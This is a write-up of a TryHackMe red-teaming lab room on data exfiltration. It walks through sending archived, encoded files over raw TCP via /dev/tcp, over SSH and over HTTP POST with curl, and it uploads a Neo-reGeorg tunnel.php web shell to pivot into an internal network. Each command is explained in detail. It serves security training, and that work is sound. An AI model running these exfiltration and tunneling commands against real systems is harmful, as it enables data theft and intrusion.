---
title: Data Exfiltration
date: 2023-10-20
categories: [THM, Red Teaming]
tags: [data-exfiltration, red-teaming, ssh, http, http-tunneling, icmp, dns, dns-tunneling]
img_path: /assets/red-teaming/data-exfiltration
mermaid: true
---
![Data Exfiltration Banner](data-exfiltration-room-banner.png)

> This is content from THM's [Data Exfiltration](https://tryhackme.com/room/dataxexfilt) room, part of the **Red Teaming** learning path.

## 1. What is Data Exfiltration?

**Data Exfiltration (DE)** is a technique used to transfer data from the target's machine to the attacker's machine. The goal is to **mimic normal network activities** in order to hide the transfer and bypass security measures.

This process is part of the last step on the [Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html): *Action on Objectives*.

![Cyber Kill Chain](https://www.lockheedmartin.com/content/dam/lockheed-martin/rms/photo/cyber/THE-CYBER-KILL-CHAIN-body.png.pc-adaptive.1280.medium.png){: width="70%"}

## 2. Network Infrastructure

This room has the following network infrastructure available:

![Network Infrastructure](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/224e0380ac936c602fe41c6537ed4565.png)

It consists of two separate networks with multiple clients as well as a Jumpbox machine with access to both networks. There is also a domain name, `thm.com`, which can be used for easier communication within the network. Below is the network information:

|  **Domain Name** | **IP Address** | **Network Access** |
|:----------------:|:--------------:|:------------------:|
| jump.thm.com     | 192.168.0.133  | Net 1 and Net 2    |
| uploader.thm.com | 172.20.0.100   | Net 1              |
| flag.thm.com     | ***.**.*.***   | Net 1              |
| victim2.thm.com  | 172.20.0.101   | Net 1              |
| web.thm.com      | 192.168.0.100  | Net 2              |
| icmp.thm.com     | 192.168.0.121  | Net 2              |
| victim1.thm.com  | 192.168.0.101  | Net 2              |

It is recommended to connect via SSH to the Jumpbox machine, and perform the rooms exercises from there. 

The room also suggests using `tmux` to manage the SSH connections needed. Another way, is to first connect to Jumpbox via SSH, then open a new terminal tab, connect to Jumpbox again, and from there connect to the required machine, e.g. `victim1`.

## 3. TCP Socket Exfiltration

This method is **easy to detect** as it relies on non-standard protocols, so it is only used when the attacker knows that they are no network-based security products. 

1. Let's start by sending some data over TCP. Open a listener on the Jumpbox machine, and store any received data on `/tmp/` as `task4-creds.data`:

    ```shell
    # connect to Jumpbox via SSH
    ssh thm@10.10.82.111
    # password: tryhackme

    # open a netcat listener on port 8080
    nc -lvp 8080 > /tmp/task4-creds.data
    ```

2. Connect to the target that has the data we want to transmit, `victim1`:

    ```shell
    # on a new terminal tab connect to Jumpbox again
    ssh thm@10.10.82.111
    # password: tryhackme

    # connect via Jumpbox to victim1 via the domain
    ssh thm@victim1.thm.com
    # or via its ip and port
    ssh thm@10.10.82.98 -p 2022
    # password: tryhackme

    # the data need to be transmitted
    cat task4/creds.txt
    ```

    ![Connect to victim1 from Jumpbox](ssh-from-jb-to-victim1.png)

3. Now, we will use the **TCP Socket exfiltration** method. We will also use **data encoding**, a reversible form of data representation, and **archiving**, so it is hard for someone to examine the data during the trasmission, as it will be in a non-human readable format.

    ```shell
    tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
    ```
    
    Let's break down this command step by step:

    1. `tar zcf - task4/` This command creates a *compressed tarball* (archive) of the `task4` directory and sends the output to the standard output (indicated by `-`) using the `tar` utility. Here's what each option does:
        - `z` Compress the archive using gzip.
        - `c` Create a new archive.
        - `f` Specify the archive file.
        - `-` Send the output to stdout (standard output) instead of a file.
        - `task4/` The directory to be archived.

    2. `|` This is a *pipe operator*, which takes the output of the previous command and passes it as input to the next command.
 
    3. `base64` This command encodes the tarball using *Base64 encoding*. Base64 is a method of encoding binary data into a text-based format.

    4. `|` Another pipe operator.

    5. `dd conv=ebcdic` This command is using the `dd` utility to perform low-level data copying and conversion. The `conv=ebcdic` option is used to convert the data from *ASCII* to *EBCDIC* encoding. *EBCDIC* is another character encoding standard, mostly used on older IBM systems.

    6. `> /dev/tcp/192.168.0.133/8080` This part of the command redirects the output to the IP address 192.168.0.133 on port 8080 using a TCP socket.

    Once we pass the above command, a connection will be received from `victim1` along with the required data in the `/tmp/` directory.

    ![Connection and data received](conn-received.png)

4. We have successfully transferred the data in a non-human readable format:

    ![Encoded data](encoded_data.png)

    We now need to decode and unarchive it:

    ```shell
    # move the /tmp/ directory
    cd /tmp/

    # decode the data
    dd conv=ascii if=task4-creds.data | base64 -d > task4-creds.tar

    # unarchive the data
    tar xf task4-creds.tar
    ```
    
    Let's break down the commands again:

    1. `dd conv=ascii if=task4-creds.data | base64 -d > task4-creds.tar` does the opposite of what we did before, that is, decoding the data.
        - `dd conv=ascii if=task4-creds.data` This part of the command uses the `dd` utility to read data from the input file `task4-creds.data`. The `conv=ascii` option specifies that the data should be converted from *EBCDIC* encoding to *ASCII*. The `if=task4-creds.data` option specifies the input file as `task4-creds.data`.

        - `|` This is a pipe operator, which we explained before.

        - `base64 -d` This part of the command uses the `base64` utility to decode the input data. The `-d` option indicates that it's meant for decoding.

        - `> task4-creds.tar` This portion of the command redirects the decoded data to an output file named `task4-creds.tar`. The data, which was originally encoded and then decoded, is saved in this file.

    2. `tar` We are using the `tar` utility again, but this time for extracting the directory.
        - `x` This option stands for "extract", and it is used to extract the contents of an archive.
        - `f` This option specifies that the next argument will be the name of the archive file from which we want to extract the contents. In this case, `task4-creds.tar` is the archive file.


    ![Decoding and unarchiving data](decode-unarchive-data.png)

## 4. SSH Exfiltration

To transfer data over SSH, we can either use the Secure Copy Protocol, `scp`, or the SSH client. For this task, we assume that we don't have the `scp` command available. 

We will use the Jumpbox as our exfiltration server, since it has an SSH server enabled. Since we are already on `victim1`'s machine, we will use this as our target to trasmit the `task5/creds.txt` file.

![Files to be trasmitted](task5-creds.png)

We will use the same method as before to archive the data, but this time instead of redictering them through a TCP socket, we will send the standard output via SSH:

```shell
tar zcf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
```

The above command creates a tarball and sends it over SSH to the Jumpbox SSH server for extraction. SSH clients provide a way to execute a single command without having a full session. Let's break it down step by step:

1. `tar zcf - task5/` We have seen this part of the command before, which compresses and archives the data.

2. `|` We have also seen what the *pipe operator* does.

3. `ssh thm@jump.thm.com "cd /tmp/; tar xpf -"` This part of the command uses the `ssh` command to establish an SSH connection. Here's what's happening:
    - `ssh thm@jump.thm.com` Initiates an SSH connection to the remote server `jump.thm.com` with the username `thm`.
    - `"cd /tmp/; tar xpf -"` This part is executed on the remote server after the SSH connection is established. It changes the working directory to `/tmp`, and then extracts a tarball from standard input. The `p` options is used to preserve file permissions, ownership, and timestamps when extracting files. This ensures that the extracted files retain their original attributes.

![SSH transmission](ssh-transmission.png)

## 5. HTTP(S) Exfiltration

### 5.1 HTTP POST Request

Data Exfiltration through HTTP(S) is one of the best methods, as it hard to distinguish between legitimate and malicious HTTP traffic. We will be using the **POST HTTP request**, as with a **GET HTTP request**, all parameters are registered into the log file. POST HTTP requests:
- Are never cached.
- Do not remain in the browser history.
- Cannot be bookmarked.
- Have no restrictions on data length.

Let's login into `web.thm.com` and inspect the Apache log file with 2 HTTP Requests:

```shell
ssh thm@web.thm.com
# password: tryhackme

sudo cat /var/log/apache2/access.log
# 192.168.0.133 - - [29/Apr/2022:11:41:54 +0100] "GET /example.php?flag=VEhNe0g3N1AtRzM3LTE1LWYwdW42fQo= HTTP/1.1" 200 495 "-" "curl/7.68.0"
# 192.168.0.133 - - [29/Apr/2022:11:42:14 +0100] "POST /example.php HTTP/1.1" 200 395 "-" "curl/7.68.0"
```
The first line is a **GET** request which includes a `file` parameter with exfiltrated data. If we decode this data, we will get the 🚩 required for the first question. The second line is a **POST** request to `/example.php`, in which we sent the same `base64` encoded data, but it does not show what data was transmitted. 

We can decode the data needed for the flag as follows:

![First flag](first-flag.jpg)

### 5.2 HTTP Data Exfiltration

The steps to perform HTTP exfiltration are:
1. We need an HTTP webserver with a data handler (a PHP page that handles the POST request sent to the server). In our case, `web.thm.com` and `contact.php`, respectively.
2. We also need a method to send the data; we will send it via `curl`.
3. A way to receive and store the data; `contact.php` will receive the POST request and store it under the `/tmp` directory.
4. Once the data is stored, we will log into the web server and grab it.

As mentioned on step 1, we already have a web server with a data handler available. The PHP code of `contact.php` can be shown below:

```php
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```

The above PHP script will handle POST requests via the `file` parameter and store the received data in the `/tmp` directory as `http.bs64`.

1. Now, from the JumpBox machine, we can connect via SSH to `victim1.thm.com`:

    ```shell
    ssh thm@victim1.thm.com
    # password: tryhackme
    ```

2. Our goal is to transfer the `/home/thm/task6`'s content:

    ```shell
    curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
    ```

    Let's break down the command:
    1. `curl` This is the command-line utility used to transfer data to or from a server using various supported protocols. In this case, we are using it for an **HTTP POST request**.
    2. `--data "file=$(tar zcf - task6 | base64)"` This part of the command specifies the data to be included in the HTTP POST request. It's using the `--data` option to send data. The data is enclosed in double quotes.
    3. `file=$(tar zcf - task6 | base64)` This is the data being sent in the POST request. It's a combination of several commands which we have used before. In brief, it creates a compressed tarball of the `task6` directory and `base64` encodes it, making it suitable for transmission in a POST request.
        - `$(...)` This is **command substitution**. It allows the output of the enclosed command sequence, in this case, the Base64-encoded tarball, to be used as a string within the `--data` parameter.
    4. `http://web.thm.com/contact.php` This part of the command specifies the URL to which the HTTP POST request will be sent. It's making a POST request to the `contact.php` script on the `web.thm.com` web server.

3. We can use the Jumpbox to log into `web.thm.com` and check if the data are located under `/tmp`:

    ```shell
    ls /tmp
    # http.bs64
    ```

    Although we have managed to transfer the data, if we take a closer look, it is broken base64: the `+` symbol got replaced with spaces.

    ![Broken base64 data](url-encoding.png)

    This happend due to **URL encoding** over HTTP. We can easily fix it using `sed`:

    ```shell
    sudo sed -i 's/ /+/g' /tmp/http.bs64
    ```

    The provided command uses the **stream editor** utility, `sed`, to make in-place replacements in the `/tmp/http.bs64` file:

    1. `sed` This is a stream editor used to perform basic text transformations on an input stream (a file or data provided via a pipe).

    2. `-i` This option indicates that it should edit the file in place.

    3. `'s/ /+/g'` This is the sed command to perform the text transformation. It's written in the form of a **substitution command**. Here's what each part does:
        - `s` This indicates that it's a substitution operation.
        - `/` This character separates the search pattern from the replacement pattern.
        - `/ /` This is the search pattern. It's looking for spaces.
        - `+` This is the replacement pattern. It replaces spaces with plus symbols.
        - `g` This is a flag that specifies that the substitution should be performed globally in the file (i.e., on all occurrences of the search pattern, not just the first one).

    4. `/tmp/http.bs64` This is the path to the file on which sed will operate.

    ![sed command](sed-command.png)

4. Finally, we need to decode the data:

    ```shell
    base64 -d /tmp/http.bs64 | tar xvfz -
    ```
### 5.3 HTTP tunneling

In our network configuration, the `uploader.thm.com` server is reachable from the Internet, but the `app.thm.com` and `flag.thm.com` servers are not. The latter runs locally and provides services only for the internal network.

![Uploader vs. app server](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/92004a7c6a572f9680f0056b9aa88baa.png)

1. Our goal for this section, is to create an **HTTP Tunnel** to pivot into the internal network and communicate with the `flag.thm.com` server. For achieving this, we will be using the [**Neo-reGeorg**](https://github.com/L-codes/Neo-reGeorg) tool. Let's clone it in our local machine:

    ```shell
    git clone https://github.com/L-codes/Neo-reGeorg
    ```

2. Next, we need to generate an encrypted client file to upload it to the target web server:

    ```shell
    python3 neoreg.py generate -k thm
    ```

    The above command generates an encrypted tunneling clients with `thm` as their key under the `neoreg_servers/` directory. Various file extensions are available, but we will use the `tunnel.php` file for this one.

    ![tunnel client list](neoreg-servers.png)

3. Now, we need to upload our client at the `uploader.thm.com` server. We can visit it via our browser at http://10.10.19.86/uploader. To upload the `tunnel.php` we must use "admin" as the key.

    ![Tunnel Upload](tunnel-upload.jpg)

4. Once the file is uploaded, we will point to it using the `neoreg.py` script in order to connect to the client, providing the key to decrypt the tunneling client:

    ```shell
    python3 neoreg.py -k thm http://10.10.19.86/uploader/files/tunnel.php
    ```

    We should get a screen that says that a **SOCKS5 server** has started at `127.0.0.1:1080`.

    ![socks5 server](socks-server.jpg)

5. We can now use the tunnel for accessing the `flag.thm.com` server with an IP address of `172.20.0.120:80`. We leave the tunnel terminal tab as it is, and on a new terminal/tab we communicate with the server via `curl`:

![Flag 2](flag2.jpg)

